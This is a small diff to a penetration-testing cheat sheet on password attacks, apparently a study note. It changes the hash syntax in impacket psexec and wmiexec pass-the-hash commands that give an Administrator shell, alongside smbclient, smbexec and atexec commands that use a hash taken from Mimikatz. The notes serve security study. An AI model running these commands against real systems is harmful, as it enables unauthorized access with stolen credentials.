@@ -82,8 +82,8 @@ pagetitle: Password Attacks
 		- `smbclient \\\\{IP}\\{SMB_share_endpoint} -U Administrator --pw-nt-hash {hash_from_Mimikatz}`
 	- Example2 - getting a shell as an Administrator with `psexec.py`
 		- Searches for a writeable share and uploads an exe to it, registers exe as a Windows service and starts it
-		- `impacket-psexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}` 
-		- `impacket-wmiexec -hashes {32_zeroes}:{hash} {DOMAIN}/{user}@{IP}`
+		- `impacket-psexec -hashes :{hash} {DOMAIN}/{user}@{IP}` 
+		- `impacket-wmiexec -hashes :{hash} {DOMAIN}/{user}@{IP}`
 		- `impacket-smbexec -hashes lmhash:nthash {domain}/{user}@{IP}`
 		- `impacket-atexec -hashes lmhash:nthash {domain}/{user}@{IP} {command}`
 - Cracking Net-NTLMv2
